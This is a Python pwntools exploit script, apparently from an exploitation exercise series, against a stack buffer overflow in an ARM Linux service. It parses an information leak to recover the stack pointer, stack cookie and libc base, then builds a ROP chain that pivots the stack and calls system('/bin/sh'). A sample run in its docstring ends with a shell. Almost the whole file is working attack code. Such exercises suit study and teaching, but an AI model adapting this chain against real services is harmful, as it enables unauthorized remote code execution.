#!/usr/bin/env python

"""
************************************
* Extended Exploitation Test (EET) *
************************************
(c) Jos Wetzels, Wouter Bokslag

python stack_bof_2_exploit.py 
[+] Opening connection to 192.168.0.103 on port 31338: Done
[+] Got stackpointer: [be9fac50]
[+] Got stack cookie: [ef6f7100]
[+] Got libc base: [b6e0b000]
[*] Building ROP chain...
[*] Sending exploit payload...
[*] Switching to interactive mode
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi)
"""

import sys
import re
from pwn import *
from struct import pack
from gadgets import arm_gadgets

def do_exploit(h, libc_version, libc_base, stack_cookie):
	print "[*] Building ROP chain..."

	# Overflow size
	overflow_size = 16

	# Offsets from libc base to ROP chain elements
	seed48_offset = arm_gadgets['libc'][libc_version]['seed48']
	system_offset = arm_gadgets['libc'][libc_version]['system']
	binsh_offset = arm_gadgets['libc'][libc_version]['binsh']
	svcerr_progvers_offset = arm_gadgets['libc'][libc_version]['svcerr_progvers']

	# Determine ROP Chain element addresses
	PIVOT_gadget = libc_base + svcerr_progvers_offset + 88 # pivot gadget
	ARG_gadget = libc_base + seed48_offset + 20     # arg setting gadget
	SYSTEM_addr = libc_base + system_offset         # system address
	BINSH_addr = libc_base + binsh_offset - 6       # /bin/sh address (minus 6)
	junk = 0x0BADC0DE                               # filler junk
	
	rop_chain = "".join([pack('<I', x) for x in [PIVOT_gadget, # sp += 0x34, pop {r4, r5, r6, r7 pc}
												 BINSH_addr,   # r4 = @/bin/sh - 6
												 junk,		   # r5 = junk
												 junk,		   # r6 = junk
												 junk,         # r7 = junk
												 ARG_gadget,   # r0 = r4 + 6, pop {r4, pc}
												 junk,         # r4 = junk
												 SYSTEM_addr]])

	# No need for stack cookie here since we directly overwrite a function pointer
	databuffer = "A"*overflow_size + rop_chain

	print "[*] Sending exploit payload..."

	h.send(databuffer)

	h.interactive()
	return

def grab_infoleak(msg):
	stack_pointer, stack_cookie = [long(x, 16) for x in re.findall('\[(.*?)\.(.*?)\]', msg.split("\n")[0], re.I)[0]]
	libc_base = long(re.findall('libc.so.6\]\@\[(.*?)\]', msg, re.M|re.I)[0], 16)

	return stack_pointer, stack_cookie, libc_base

host = '192.168.0.102'
port = 1338
libc_version = '2.19'

h = remote(host, port, timeout = None)

msg = h.recvuntil('> ')
stack_pointer, stack_cookie, libc_base = grab_infoleak(msg)

print "[+] Got stackpointer: [%x]" % stack_pointer
print "[+] Got stack cookie: [%x]" % stack_cookie
print "[+] Got libc base: [%x]" % libc_base

do_exploit(h, libc_version, libc_base, stack_cookie)